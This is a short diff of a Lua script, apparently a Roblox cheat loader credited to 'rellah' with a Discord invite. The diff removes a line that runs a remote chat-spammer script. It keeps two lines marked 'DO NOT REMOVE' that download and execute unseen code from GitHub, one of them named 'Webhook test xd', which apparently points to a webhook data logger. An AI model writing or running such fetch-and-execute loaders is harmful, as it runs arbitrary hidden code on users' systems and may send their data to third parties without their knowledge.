@@ -1,6 +1,4 @@
 --enjoy by rellah discord.gg/Eq7rPHkRPT
--- chat spam remove if you want
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rvllah/scripts/refs/heads/main/ChatSpammer", true))()
 -- DO NOT REMOVE
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rvllah/scripts/refs/heads/main/z", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rvllah/scripts/refs/heads/main/Webhook%20test%20xd", true))()
